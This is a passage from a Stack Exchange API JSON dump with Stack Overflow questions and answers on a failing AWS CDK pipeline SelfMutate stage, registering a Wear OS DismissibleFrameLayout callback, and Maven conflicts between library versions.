(/usr/local/lib/node_modules/aws-cdk/lib/cdk-toolkit.ts:545:13)\r\n    at CdkToolkit.selectStacksForDeploy (/usr/local/lib/node_modules/aws-cdk/lib/cdk-toolkit.ts:492:10)\r\n    at CdkToolkit.deploy (/usr/local/lib/node_modules/aws-cdk/lib/cdk-toolkit.ts:120:20)\r\n    at initCommandLine (/usr/local/lib/node_modules/aws-cdk/bin/cdk.ts:267:9)\r\n\r\nCommand did not exit successfully cdk -a . deploy xxxPipelinexxxStack --require-approval=never --verbose exit status 1\r\nPhase complete: BUILD State: FAILED\r\nPhase context status code: COMMAND_EXECUTION_ERROR Message: Error while executing command: cdk -a . deploy xxxPipelinexxxStack --require-approval=never --verbose. Reason: exit status 1\r\n```\r\n\r\nCommand:&#160;```sudo cdk bootstrap```\r\nResult:\r\n```\r\n@aws-cdk/core:newStyleStackSynthesis&#39; context set, using new-style bootstrapping    Bootstrapping environment aws://xxxxxx729/us-east-1... Trusted accounts for deployment: xxxxxx729 Trusted accounts for lookup: (none) Execution policies: arn:aws:iam::aws:policy/AdministratorAccess  Environment aws://xxxxxx729/us-east-1 bootstrapped (no changes).\r\n```\r\n\r\nApp Code -\r\n```\r\n\r\npublic class xxxxPipelinexxxApp {\r\n    public static void main(final String[] args) {\r\n        App app = new App();\r\n        final xxxJavaxxxStack javaStack = new xxxJavaxxxStack(\r\n            app,\r\n            &quot;xxxJavaxxxStack&quot;,\r\n            StackProps.builder()\r\n                .env(\r\n                    new Environment.Builder()\r\n                        .account(&quot;xxxxxx5729&quot;)\r\n                        .region(&quot;us-east-1&quot;)\r\n                        .build()\r\n                )\r\n                .build()\r\n        );\r\n        final xxxPipelinexxxStack pipelineStack = new xxxPipelinexxxStack(\r\n                app,\r\n                &quot;xxxPipelinexxxStack&quot;,\r\n                StackProps.builder()\r\n                    .env(\r\n                        new Environment.Builder()\r\n                            .account(&quot;xxxxxx5729&quot;)\r\n                            .region(&quot;us-east-1&quot;)\r\n                            .build()\r\n                    )\r\n                    .build()\r\n        );\r\n        app.synth();\r\n    }\r\n}\r\n```\r\n\r\nStack code -\r\n```\r\npublic class xxxPipelinexxxStack extends Stack {\r\n    public xxxPipelinexxxStack(final Construct scope, final String id) {\r\n        this(scope, id, null);\r\n    }\r\n\r\n    public xxxPipelinexxxStack(final Construct scope, final String id, final StackProps props) {\r\n        super(scope, id, props);\r\n        CodePipeline pipeline = CodePipeline.Builder\r\n                .create(this, &quot;pipeline&quot;)\r\n                .pipelineName(&quot;xxxPipelineXXX&quot;)\r\n                .synth(\r\n                        ShellStep.Builder.create(&quot;Synth&quot;)\r\n                            .input(\r\n                                    CodePipelineSource.connection(&quot;&lt;git-owner&gt;/&lt;git-repo&gt;&quot;, &quot;main&quot;,\r\n                                        ConnectionSourceOptions.builder().connectionArn(&quot;&lt;git-repo-connection-arn&gt;&quot;).build()\r\n                                    )\r\n                            )\r\n                            .commands(\r\n                                    Arrays.asList(&quot;mvn clean install&quot;, &quot;npx cdk synth&quot;)\r\n                            ).build()\r\n                ).build();\r\n        final xxxPipelineXXXStage deploy = new xxxPipelineXXXStage(this, &quot;Deploy&quot;);\r\n        pipeline.addStage(deploy);\r\n    }\r\n}\r\n```\r\n\r\nP.S: I&#39;m using a different IAM user, to deploy, than the root user as apparently there are issues when trying to deploy the pipeline using root user.\r\n\r\nAny help is much appreciated.\r\n","title":"SelfMutate stage failing with CodePipeline","body":"<p>I'm trying to create a CI/CD using CDK pipeline with the import <code>software.amazon.awscdk.pipelines.CodePipeline</code> in Java.\nThis pipeline creates another stack named <strong>xxxJavaxxxStack</strong>.\nThe pipeline is able to connect to external github, which, when change is detected, triggers the pipeline.</p>\n<p>In the class <code>xxxPipelinexxxApp.java</code> I'm calling both the stacks <code>xxxJavaxxxStack</code> and <code>xxxPipelinexxxStack</code>. I have successfully been able to <strong>cdk synth</strong> both separately and <strong>cdk deploy</strong> them separately.</p>\n<p>This creates 2 different cloudformation templates, it also creates the pipeline and the first 2 stages go through.\nHowever, the pipeline is failing at <strong>SelfMutate</strong> stage.</p>\n<p>The pipeline stages are:</p>\n<ul>\n<li><strong>Source</strong> - Success</li>\n<li><strong>Build</strong> - Success\n<ul>\n<li><strong>Synth</strong> - Success</li>\n</ul>\n</li>\n<li><strong>SelfMutate</strong> - Failed</li>\n</ul>\n<p>The error:</p>\n<pre><code>Error: No stacks match the name(s) xxxPipelinexxxStack\n\nat CdkToolkit.validateStacksSelected (/usr/local/lib/node_modules/aws-cdk/lib/cdk-toolkit.ts:545:13)\n    at CdkToolkit.selectStacksForDeploy (/usr/local/lib/node_modules/aws-cdk/lib/cdk-toolkit.ts:492:10)\n    at CdkToolkit.deploy (/usr/local/lib/node_modules/aws-cdk/lib/cdk-toolkit.ts:120:20)\n    at initCommandLine (/usr/local/lib/node_modules/aws-cdk/bin/cdk.ts:267:9)\n\nCommand did not exit successfully cdk -a . deploy xxxPipelinexxxStack --require-approval=never --verbose exit status 1\nPhase complete: BUILD State: FAILED\nPhase context status code: COMMAND_EXECUTION_ERROR Message: Error while executing command: cdk -a . deploy xxxPipelinexxxStack --require-approval=never --verbose. Reason: exit status 1\n</code></pre>\n<p>Command:<code>sudo cdk bootstrap</code>\nResult:</p>\n<pre><code>@aws-cdk/core:newStyleStackSynthesis' context set, using new-style bootstrapping    Bootstrapping environment aws://xxxxxx729/us-east-1... Trusted accounts for deployment: xxxxxx729 Trusted accounts for lookup: (none) Execution policies: arn:aws:iam::aws:policy/AdministratorAccess  Environment aws://xxxxxx729/us-east-1 bootstrapped (no changes).\n</code></pre>\n<p>App Code -</p>\n<pre><code>\npublic class xxxxPipelinexxxApp {\n    public static void main(final String[] args) {\n        App app = new App();\n        final xxxJavaxxxStack javaStack = new xxxJavaxxxStack(\n            app,\n            &quot;xxxJavaxxxStack&quot;,\n            StackProps.builder()\n                .env(\n                    new Environment.Builder()\n                        .account(&quot;xxxxxx5729&quot;)\n                        .region(&quot;us-east-1&quot;)\n                        .build()\n                )\n                .build()\n        );\n        final xxxPipelinexxxStack pipelineStack = new xxxPipelinexxxStack(\n                app,\n                &quot;xxxPipelinexxxStack&quot;,\n                StackProps.builder()\n                    .env(\n                        new Environment.Builder()\n                            .account(&quot;xxxxxx5729&quot;)\n                            .region(&quot;us-east-1&quot;)\n                            .build()\n                    )\n                    .build()\n        );\n        app.synth();\n    }\n}\n</code></pre>\n<p>Stack code -</p>\n<pre><code>public class xxxPipelinexxxStack extends Stack {\n    public xxxPipelinexxxStack(final Construct scope, final String id) {\n        this(scope, id, null);\n    }\n\n    public xxxPipelinexxxStack(final Construct scope, final String id, final StackProps props) {\n        super(scope, id, props);\n        CodePipeline pipeline = CodePipeline.Builder\n                .create(this, &quot;pipeline&quot;)\n                .pipelineName(&quot;xxxPipelineXXX&quot;)\n                .synth(\n                        ShellStep.Builder.create(&quot;Synth&quot;)\n                            .input(\n                                    CodePipelineSource.connection(&quot;&lt;git-owner&gt;/&lt;git-repo&gt;&quot;, &quot;main&quot;,\n                                        ConnectionSourceOptions.builder().connectionArn(&quot;&lt;git-repo-connection-arn&gt;&quot;).build()\n                                    )\n                            )\n                            .commands(\n                                    Arrays.asList(&quot;mvn clean install&quot;, &quot;npx cdk synth&quot;)\n                            ).build()\n                ).build();\n        final xxxPipelineXXXStage deploy = new xxxPipelineXXXStage(this, &quot;Deploy&quot;);\n        pipeline.addStage(deploy);\n    }\n}\n</code></pre>\n<p>P.S: I'm using a different IAM user, to deploy, than the root user as apparently there are issues when trying to deploy the pipeline using root user.</p>\n<p>Any help is much appreciated.</p>\n"},{"tags":["java","android","wear-os"],"comments":[{"owner":{"account_id":-1,"reputation":1,"user_id":-1,"display_name":"Community"},"score":0,"creation_date":1640784844,"post_id":70442070,"comment_id":124657818,"body_markdown":"Please edit the question to limit it to a specific problem with enough detail to identify an adequate answer.","body":"Please edit the question to limit it to a specific problem with enough detail to identify an adequate answer."}],"answers":[{"tags":[],"owner":{"account_id":1481915,"reputation":12601,"user_id":1542667,"accept_rate":75,"display_name":"Yuri Schimke"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640252541,"creation_date":1640252541,"answer_id":70460236,"question_id":70442070,"body_markdown":"There are plenty of examples on github.\r\n\r\nFor example using viewBinding\r\n\r\nhttps://github.com/joharei/nearby-mobility/blob/5e0244b4daeb0aac04c5dc661c7dde6c1769cf21/app/src/main/java/app/reitan/nearby_mobility/MainActivity.kt\r\n\r\n```\r\n        ActivityMainBinding.inflate(layoutInflater).apply {\r\n            setContentView(root)\r\n\r\n            swipeDismissRootContainer.registerCallback(object :\r\n                DismissibleFrameLayout.Callback() {\r\n                override fun onDismissFinished(layout: DismissibleFrameLayout) {\r\n                    // Hides view before exit to avoid stutter.\r\n                    layout.visibility = View.GONE\r\n                    finish()\r\n                }\r\n            })\r\n```\r\n\r\n\r\nhttps://github.com/search?q=DismissibleFrameLayout&amp;type=code","title":"How do I register a callback for a dismissableFrameLayout in Android?","body":"<p>There are plenty of examples on github.</p>\n<p>For example using viewBinding</p>\n<p><a href=\"https://github.com/joharei/nearby-mobility/blob/5e0244b4daeb0aac04c5dc661c7dde6c1769cf21/app/src/main/java/app/reitan/nearby_mobility/MainActivity.kt\" rel=\"nofollow noreferrer\">https://github.com/joharei/nearby-mobility/blob/5e0244b4daeb0aac04c5dc661c7dde6c1769cf21/app/src/main/java/app/reitan/nearby_mobility/MainActivity.kt</a></p>\n<pre><code>        ActivityMainBinding.inflate(layoutInflater).apply {\n            setContentView(root)\n\n            swipeDismissRootContainer.registerCallback(object :\n                DismissibleFrameLayout.Callback() {\n                override fun onDismissFinished(layout: DismissibleFrameLayout) {\n                    // Hides view before exit to avoid stutter.\n                    layout.visibility = View.GONE\n                    finish()\n                }\n            })\n</code></pre>\n<p><a href=\"https://github.com/search?q=DismissibleFrameLayout&amp;type=code\" rel=\"nofollow noreferrer\">https://github.com/search?q=DismissibleFrameLayout&amp;type=code</a></p>\n"}],"owner":{"account_id":946975,"reputation":1,"user_id":974030,"display_name":"user974030"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":94,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640252541,"creation_date":1640124247,"question_id":70442070,"body_markdown":"I&#39;m trying to use [this layout component][1].  I just don&#39;t know how to register a callback. I need to register the [onDismissFinished][2] callback but I&#39;m at a loss.  I&#39;m working in Java, Thanks.\r\n\r\n\r\n  [1]: https://developer.android.com/reference/androidx/wear/widget/DismissibleFrameLayout?hl=de\r\n  [2]: https://developer.android.com/reference/androidx/wear/widget/DismissibleFrameLayout.Callback?hl=de#onDismissFinished(androidx.wear.widget.DismissibleFrameLayout)","title":"How do I register a callback for a dismissableFrameLayout in Android?","body":"<p>I'm trying to use <a href=\"https://developer.android.com/reference/androidx/wear/widget/DismissibleFrameLayout?hl=de\" rel=\"nofollow noreferrer\">this layout component</a>.  I just don't know how to register a callback. I need to register the <a href=\"https://developer.android.com/reference/androidx/wear/widget/DismissibleFrameLayout.Callback?hl=de#onDismissFinished(androidx.wear.widget.DismissibleFrameLayout)\" rel=\"nofollow noreferrer\">onDismissFinished</a> callback but I'm at a loss.  I'm working in Java, Thanks.</p>\n"},{"tags":["java","maven"],"comments":[{"owner":{"account_id":18250,"reputation":39302,"user_id":41655,"accept_rate":76,"display_name":"millimoose"},"score":1,"creation_date":1384469566,"post_id":19990004,"comment_id":29761774,"body_markdown":"What do you mean by &quot;final jar file contains both `CommonModule-v1.jar` and `CommonModule-v2.jar`&quot;? You usually don&#39;t package JARs inside other JARs. Your question doesn&#39;t really make much sense the way Java apps are commonly deployed. (Which is with a flat list of all transitive dependencies somewhere on the classpath.)","body":"What do you mean by &quot;final jar file contains both <code>CommonModule-v1.jar</code> and <code>CommonModule-v2.jar</code>&quot;? You usually don&#39;t package JARs inside other JARs. Your question doesn&#39;t really make much sense the way Java apps are commonly deployed. (Which is with a flat list of all transitive dependencies somewhere on the classpath.)"},{"owner":{"account_id":240468,"reputation":3778,"user_id":510711,"accept_rate":53,"display_name":"flob"},"score":0,"creation_date":1384470057,"post_id":19990004,"comment_id":29761981,"body_markdown":"Maven will use the newest version, you could try dependency:analyze-duplicate.","body":"Maven will use the newest version, you could try dependency:analyze-duplicate."},{"owner":{"account_id":2596722,"reputation":3827,"user_id":2250246,"accept_rate":33,"display_name":"user2250246"},"score":0,"creation_date":1384473905,"post_id":19990004,"comment_id":29763355,"body_markdown":"@millimoose, welcome to maven","body":"@millimoose, welcome to maven"},{"owner":{"account_id":18250,"reputation":39302,"user_id":41655,"accept_rate":76,"display_name":"millimoose"},"score":0,"creation_date":1384533778,"post_id":19990004,"comment_id":29788094,"body_markdown":"@user2250246 I know Maven well enough and what you describe is not how Maven works. For one `mvn package` will only JAR up the given module&#39;s class files, it doesn&#39;t do anything with the dependencies after the compilation. If you&#39;re making a WAR, then it will put the dependencies into `WEB-INF/lib/`, but in that case it will pick one of the versions, not both. (Unless the different versions have a different `groupId`+`artifactId`, which isn&#39;t really something Maven can handle automatically.) So how about instead of being glib you describe what&#39;s actually going on?","body":"@user2250246 I know Maven well enough and what you describe is not how Maven works. For one <code>mvn package</code> will only JAR up the given module&#39;s class files, it doesn&#39;t do anything with the dependencies after the compilation. If you&#39;re making a WAR, then it will put the dependencies into <code>WEB-INF&#47;lib&#47;</code>, but in that case it will pick one of the versions, not both. (Unless the different versions have a different <code>groupId</code>+<code>artifactId</code>, which isn&#39;t really something Maven can handle automatically.) So how about instead of being glib you describe what&#39;s actually going on?"},{"owner":{"account_id":18250,"reputation":39302,"user_id":41655,"accept_rate":76,"display_name":"millimoose"},"score":0,"creation_date":1384533864,"post_id":19990004,"comment_id":29788137,"body_markdown":"**tl;dr**: Maven does not, by default, put `jar`s inside other `jar`s. If yours does, post the relevant configuration.","body":"<b>tl;dr</b>: Maven does not, by default, put <code>jar</code>s inside other <code>jar</code>s. If yours does, post the relevant configuration."},{"owner":{"account_id":2596722,"reputation":3827,"user_id":2250246,"accept_rate":33,"display_name":"user2250246"},"score":0,"creation_date":1384555755,"post_id":19990004,"comment_id":29798428,"body_markdown":"millimoose, I got my answer from the below responses. So I guess it was glib enough.","body":"millimoose, I got my answer from the below responses. So I guess it was glib enough."}],"answers":[{"tags":[],"owner":{"account_id":64344,"reputation":8352,"user_id":189992,"accept_rate":95,"display_name":"ssedano"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1384470106,"creation_date":1384469407,"answer_id":19990082,"question_id":19990004,"body_markdown":"If your pom.xml is only an aggregator of already packaged modules then this apply. If it is not the case and your project actually compile and packages all of those modules as a submodules then maven will choose one. If it compiles every project on its own then it will be packaged using that dependency. But if all of them end up in the same class loader then it won&#39;t work fine.\r\n\r\nAt runtime it can cause errors, think of `method not found` and the like. Your byte code classes were compiled and linked with the correct dependencies but since the class loader finds two candidates it just load one at runtime.\r\n\r\nWhat you can do is set a parent pom defining a `&lt;dependencyManagement&gt;` and then ask all teams to use it as a parent and don&#39;t declare `&lt;version&gt;` but inherit it from the parent pom.xml.\r\n\r\nReferences http://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Dependency_Management","title":"Maven: Different library versions in one JVM","body":"<p>If your pom.xml is only an aggregator of already packaged modules then this apply. If it is not the case and your project actually compile and packages all of those modules as a submodules then maven will choose one. If it compiles every project on its own then it will be packaged using that dependency. But if all of them end up in the same class loader then it won't work fine.</p>\n\n<p>At runtime it can cause errors, think of <code>method not found</code> and the like. Your byte code classes were compiled and linked with the correct dependencies but since the class loader finds two candidates it just load one at runtime.</p>\n\n<p>What you can do is set a parent pom defining a <code>&lt;dependencyManagement&gt;</code> and then ask all teams to use it as a parent and don't declare <code>&lt;version&gt;</code> but inherit it from the parent pom.xml.</p>\n\n<p>References <a href=\"http://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Dependency_Management\" rel=\"nofollow\">http://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Dependency_Management</a></p>\n"},{"tags":[],"owner":{"account_id":2529977,"reputation":4602,"user_id":2198470,"accept_rate":80,"display_name":"thst"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1384469492,"creation_date":1384469492,"answer_id":19990112,"question_id":19990004,"body_markdown":"This depends on the way the modules are named in maven. Usually, maven tries to resolve the conflicting libs and takes the highest version into the tree. But if the libraries are different artifacts in terms of artifactId, then maven will not see that they are from the same breed and thus will not resolve the ambiguity. \r\n\r\nUsually you resolve this by a common parent.pom, where you define the versions of commonly used libraries throughout the project. If you have no control over the other projects (not part of your build, only dependencies), you may be lucky to have your final project working fine. If the library breaks compatibility in the newer version, you will not be able to use it.\r\n\r\nSo, does your final project contain both versions of the library or not, did you check it? The dependency tree may show both versions, but if maven will use only the latest version of a dependency in the hierarchy.\r\n\r\n","title":"Maven: Different library versions in one JVM","body":"<p>This depends on the way the modules are named in maven. Usually, maven tries to resolve the conflicting libs and takes the highest version into the tree. But if the libraries are different artifacts in terms of artifactId, then maven will not see that they are from the same breed and thus will not resolve the ambiguity. </p>\n\n<p>Usually you resolve this by a common parent.pom, where you define the versions of commonly used libraries throughout the project. If you have no control over the other projects (not part of your build, only dependencies), you may be lucky to have your final project working fine. If the library breaks compatibility in the newer version, you will not be able to use it.</p>\n\n<p>So, does your final project contain both versions of the library or not, did you check it? The dependency tree may show both versions, but if maven will use only the latest version of a dependency in the hierarchy.</p>\n"},{"tags":[],"owner":{"account_id":1079173,"reputation":42590,"user_id":1076640,"display_name":"yshavit"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1384469529,"creation_date":1384469529,"answer_id":19990124,"question_id":19990004,"body_markdown":"Maven will only use one version of each artifact in the end -- it doesn&#39;t do any fancy classloader isolation tricks. You can see which version it&#39;ll use with `mvn dependency:resolve`.\r\n\r\nIf you need to use specific versions within dependencies, you can use the [shade plugin][1]. It&#39;ll do renaming trickery so that dependencies get their own versions of libraries.\r\n\r\n\r\n  [1]: http://maven.apache.org/plugins/maven-shade-plugin/","title":"Maven: Different library versions in one JVM","body":"<p>Maven will only use one version of each artifact in the end -- it doesn't do any fancy classloader isolation tricks. You can see which version it'll use with <code>mvn dependency:resolve</code>.</p>\n\n<p>If you need to use specific versions within dependencies, you can use the <a href=\"http://maven.apache.org/plugins/maven-shade-plugin/\" rel=\"nofollow\">shade plugin</a>. It'll do renaming trickery so that dependencies get their own versions of libraries.</p>\n"},{"tags":[],"owner":{"account_id":2078312,"reputation":16240,"user_id":1851024,"accept_rate":82,"display_name":"Andrey Chaschev"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1384469571,"creation_date":1384469571,"answer_id":19990133,"question_id":19990004,"body_markdown":"Classloader will load the first JAR which appears on your classpath. In more details - it will search for the first class on your class path, so in each case all these searches would fall into i.e. `CommonModule-v2.jar`. So the answer is yes - it can erroneously load versions v2 where v1 if it appears earlier on your classpath.","title":"Maven: Different library versions in one JVM","body":"<p>Classloader will load the first JAR which appears on your classpath. In more details - it will search for the first class on your class path, so in each case all these searches would fall into i.e. <code>CommonModule-v2.jar</code>. So the answer is yes - it can erroneously load versions v2 where v1 if it appears earlier on your classpath.</p>\n"},{"tags":[],"owner":{"account_id":243786,"reputation":30863,"user_id":516167,"accept_rate":94,"display_name":"MariuszS"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1384470440,"creation_date":1384470065,"answer_id":19990242,"question_id":19990004,"body_markdown":"To fight with this problem globally use this [DependencyConvergence Rule](http://maven.apache.org/enforcer/enforcer-rules/dependencyConvergence.html)\r\n\r\n&gt; This rule requires that dependency version numbers converge. If a\r\n&gt; project has two dependencies, A and B, both depending on the same\r\n&gt; artifact, C, this rule will fail the build if A depends on a different\r\n&gt; version of C then the version of C depended on by B.\r\n\r\n    &lt;plugin&gt;\r\n        &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\r\n        &lt;artifactId&gt;maven-enforcer-plugin&lt;/artifactId&gt;\r\n        &lt;version&gt;1.3.1&lt;/version&gt;\r\n        &lt;executions&gt;\r\n          &lt;execution&gt;\r\n            &lt;id&gt;enforce&lt;/id&gt;\r\n            &lt;configuration&gt;\r\n              &lt;rules&gt;\r\n                &lt;DependencyConvergence/&gt;\r\n              &lt;/rules&gt;\r\n            &lt;/configuration&gt;\r\n            &lt;goals&gt;\r\n              &lt;goal&gt;enforce&lt;/goal&gt;\r\n            &lt;/goals&gt;\r\n          &lt;/execution&gt;\r\n        &lt;/executions&gt;\r\n    &lt;/plugin&gt;\r\n\r\nAfter this all teams work together with consistent versions of dependencies.","title":"Maven: Different library versions in one JVM","body":"<p>To fight with this problem globally use this <a href=\"http://maven.apache.org/enforcer/enforcer-rules/dependencyConvergence.html\" rel=\"nofollow\">DependencyConvergence Rule</a></p>\n\n<blockquote>\n  <p>This rule requires that dependency version numbers converge. If a\n  project has two dependencies, A and B, both depending on the same\n  artifact, C, this rule will fail the build if A depends on a different\n  version of C then the version of C depended on by B.</p>\n</blockquote>\n\n<pre><code>&lt;plugin&gt;\n    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n    &lt;artifactId&gt;maven-enforcer-plugin&lt;/artifactId&gt;\n    &lt;version&gt;1.3.1&lt;/version&gt;\n    &lt;executions&gt;\n      &lt;execution&gt;\n        &lt;id&gt;enforce&lt;/id&gt;\n        &lt;configuration&gt;\n          &lt;rules&gt;\n            &lt;DependencyConvergence/&gt;\n          &lt;/rules&gt;\n        &lt;/configuration&gt;\n        &lt;goals&gt;\n          &lt;goal&gt;enforce&lt;/goal&gt;\n        &lt;/goals&gt;\n      &lt;/execution&gt;\n    &lt;/executions&gt;\n&lt;/plugin&gt;\n</code></pre>\n\n<p>After this all teams work together with consistent versions of dependencies.</p>\n"},{"tags":[],"owner":{"account_id":24269,"reputation":63221,"user_id":61624,"accept_rate":60,"display_name":"Daniel Kaplan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1384470154,"creation_date":1384470154,"answer_id":19990254,"question_id":19990004,"body_markdown":"On top of what @yshavit said, ideally you&#39;d exclude the earlier version of the `CommonModule` so that only v2 is in the classpath.  This is only possible if the `CommonModule` v2 api is backwards compatible with `CommonModule` v1.  \r\n\r\nHere&#39;s an example of how you exclude:\r\n\r\n        &lt;dependency&gt;\r\n            &lt;groupId&gt;ChildModuleGroupid&lt;/groupId&gt;\r\n            &lt;artifactId&gt;ChildModuleArtifactid&lt;/artifactId&gt;\r\n            &lt;version&gt;1.0&lt;/version&gt;\r\n            &lt;exclusions&gt;\r\n                &lt;exclusion&gt;\r\n                    &lt;groupId&gt;CommonModuleGroupId&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;CommonModuleArtifactId&lt;/artifactId&gt;\r\n                &lt;/exclusion&gt;\r\n            &lt;/exclusions&gt;\r\n        &lt;/dependency&gt;\r\n\r\nYou&#39;d put that in the TopModule pom.xml.","title":"Maven: Different library versions in one JVM","body":"<p>On top of what @yshavit said, ideally you'd exclude the earlier version of the <code>CommonModule</code> so that only v2 is in the classpath.  This is only possible if the <code>CommonModule</code> v2 api is backwards compatible with <code>CommonModule</code> v1.  </p>\n\n<p>Here's an example of how you exclude:</p>\n\n<pre><code>    &lt;dependency&gt;\n        &lt;groupId&gt;ChildModuleGroupid&lt;/groupId&gt;\n        &lt;artifactId&gt;ChildModuleArtifactid&lt;/artifactId&gt;\n        &lt;version&gt;1.0&lt;/version&gt;\n        &lt;exclusions&gt;\n            &lt;exclusion&gt;\n                &lt;groupId&gt;CommonModuleGroupId&lt;/groupId&gt;\n                &lt;artifactId&gt;CommonModuleArtifactId&lt;/artifactId&gt;\n            &lt;/exclusion&gt;\n        &lt;/exclusions&gt;\n    &lt;/dependency&gt;\n</code></pre>\n\n<p>You'd put that in the TopModule pom.xml.</p>\n"}],"owner":{"account_id":2596722,"reputation":3827,"user_id":2250246,"accept_rate":33,"display_name":"user2250246"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3516,"favorite_count":0,"down_vote_count":0,"up_vote_count":5,"answer_count":6,"score":5,"last_activity_date":1640252057,"creation_date":1384469033,"question_id":19990004,"body_markdown":"I have a project whose dependency tree is huge i.e. it packs in modules from several teams.\r\n\r\nNow there are some commonly used dependencies which are common across several modules.\r\n\r\nA simplified example can be:\r\n\r\n    TopModule.jar\r\n      ChildModule.jar\r\n        CommonModule-v1.jar\r\n      CommonModule-v2.jar\r\n\r\nWhen I build my project, I specify the latest version of common dependencies, but its very hard to ask the same from every other team.\r\n\r\nSo, frequently, the TopModule is built using different versions of CommonModule (v1 and v2 in the above example).\r\n\r\nMy question is:\r\n\r\nIf the final jar file contains both CommonModule-v1.jar and CommonModule-v2.jar, how does it affect the runtime?\r\n\r\nCan the runtime erroneously load versions v2 where v1 is required and vice versa?\r\n\r\n ","title":"Maven: Different library versions in one JVM","body":"<p>I have a project whose dependency tree is huge i.e. it packs in modules from several teams.</p>\n\n<p>Now there are some commonly used dependencies which are common across several modules.</p>\n\n<p>A simplified example can be:</p>\n\n<pre><code>TopModule.jar\n  ChildModule.jar\n    CommonModule-v1.jar\n  CommonModule-v2.jar\n</code></pre>\n\n<p>When I build my project, I specify the latest version of common dependencies, but its very hard to ask the same from every other team.</p>\n\n<p>So, frequently, the TopModule is built using different versions of CommonModule (v1 and v2 in the above example).</p>\n\n<p>My question is:</p>\n\n<p>If the final jar file contains both CommonModule-v1.jar and CommonModule-v2.jar, how does it affect the runtime?</p>\n\n<p>Can the runtime erroneously load versions v2 where v1 is required and vice versa?</p>\n"}],"has_more":true,"quota_max":10000,"quota_remaining":8256,"page":1736,"page_size":100}
